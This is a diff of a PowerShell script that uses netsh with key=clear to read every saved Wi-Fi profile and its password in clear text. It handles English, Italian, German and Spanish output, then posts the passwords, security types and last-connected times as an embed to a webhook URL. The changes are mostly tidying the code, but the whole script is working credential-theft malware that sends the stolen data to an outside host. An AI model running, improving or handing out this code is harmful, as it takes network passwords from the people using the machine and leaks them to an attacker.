@@ -4,16 +4,12 @@ $profiles = @()
 foreach ($line in $rawProfiles) {
     if ($line -match 'All User Profile|Tutti i profili utente|Alle Profile|Todos los perfiles') {
         $parts = $line -split ':'
-        if ($parts.Length -ge 2) {
-            $profiles += $parts[1].Trim()
-        }
+        if ($parts.Length -ge 2) { $profiles += $parts[1].Trim() }
     }
 }
-if ($profiles.Count -eq 0) {
-    Write-Host "No Wi-Fi profiles found."
-    exit
-}
-$fields=@()
+if ($profiles.Count -eq 0) { Write-Host "No Wi-Fi profiles found."; exit }
+
+$fields = @()
 foreach ($p in $profiles) {
     $details = netsh wlan show profile name="$p" key=clear
     $passLine = $details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
@@ -25,23 +21,20 @@ foreach ($p in $profiles) {
     $lastConn = if ($lastConnLine) { ($lastConnLine -split ':')[1].Trim() } else { '[Unknown]' }
 
     if ($p.Length -gt 0) {
-        $fields += [PSCustomObject]@{
-            name = if ($p.Length -gt 256) { $p.Substring(0, 256) } else { $p }
+        $fields += @{
+            name = if ($p.Length -gt 256) { $p.Substring(0,256) } else { $p }
             value = "Password: $password`nSecurity: $security`nLast Connected: $lastConn"
             inline = $true
         }
     }
 }
 
-if ($fields.Count -eq 0) {
-    Write-Host "No valid Wi-Fi profiles to send."
-    exit
-}
+if ($fields.Count -eq 0) { Write-Host "No valid Wi-Fi profiles to send."; exit }
 
-$embed=@{
+$embed = @{
     title = "Detected Wi-Fi Networks"
     color = 3447003
     fields = $fields
 }
-$body=@{embeds=@($embed)} | ConvertTo-Json -Compress
+$body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
